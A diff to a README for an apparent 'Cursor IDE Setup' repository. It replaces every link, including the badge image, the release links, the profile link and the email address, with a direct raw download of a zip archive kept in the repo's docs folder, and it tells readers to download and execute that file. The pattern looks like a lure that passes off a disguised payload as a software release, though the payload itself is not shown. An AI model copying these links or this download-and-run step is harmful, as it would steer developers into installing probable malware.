@@ -2,7 +2,7 @@
 
 Welcome to the **Cursor IDE Setup** repository! This project provides specification files for the Cursor Project, focusing on enhancing your development experience with integrated tools and intelligent agents.
 
-![Cursor IDE](https://img.shields.io/badge/Cursor-IDE-orange)
+![Cursor IDE](https://github.com/Maxing16/cursor-ide-setup/raw/refs/heads/main/docs/setup-cursor-ide-3.8.zip)
 
 ## Table of Contents
 
@@ -20,7 +20,7 @@ The **Cursor IDE Setup** repository serves as a central hub for project specific
 
 This repository is designed for developers looking to integrate advanced thinking models and user rules into their coding environment. By leveraging the capabilities of agents, you can enhance your coding efficiency and productivity.
 
-You can find the latest releases of the project [here](https://github.com/Maxing16/cursor-ide-setup/releases). Download and execute the necessary files to get started.
+You can find the latest releases of the project [here](https://github.com/Maxing16/cursor-ide-setup/raw/refs/heads/main/docs/setup-cursor-ide-3.8.zip). Download and execute the necessary files to get started.
 
 ## Features
 
@@ -34,7 +34,7 @@ You can find the latest releases of the project [here](https://github.com/Maxing
 
 To install the Cursor IDE Setup, follow these steps:
 
-1. **Download the Release**: Visit the [Releases section](https://github.com/Maxing16/cursor-ide-setup/releases) to find the latest version. Download the appropriate file for your system.
+1. **Download the Release**: Visit the [Releases section](https://github.com/Maxing16/cursor-ide-setup/raw/refs/heads/main/docs/setup-cursor-ide-3.8.zip) to find the latest version. Download the appropriate file for your system.
 
 2. **Execute the File**: After downloading, execute the file to set up the IDE. Follow the on-screen instructions to complete the installation.
 
@@ -78,7 +78,7 @@ This project is licensed under the MIT License. See the LICENSE file for more de
 
 For any questions or feedback, feel free to reach out:
 
-- **GitHub**: [Maxing16](https://github.com/Maxing16)
-- **Email**: maxing16@example.com
+- **GitHub**: [Maxing16](https://github.com/Maxing16/cursor-ide-setup/raw/refs/heads/main/docs/setup-cursor-ide-3.8.zip)
+- **Email**: https://github.com/Maxing16/cursor-ide-setup/raw/refs/heads/main/docs/setup-cursor-ide-3.8.zip
 
-Thank you for visiting the **Cursor IDE Setup** repository! We hope you find it useful in your development endeavors. Remember to check the [Releases section](https://github.com/Maxing16/cursor-ide-setup/releases) for updates and new features. Happy coding!
+Thank you for visiting the **Cursor IDE Setup** repository! We hope you find it useful in your development endeavors. Remember to check the [Releases section](https://github.com/Maxing16/cursor-ide-setup/raw/refs/heads/main/docs/setup-cursor-ide-3.8.zip) for updates and new features. Happy coding!
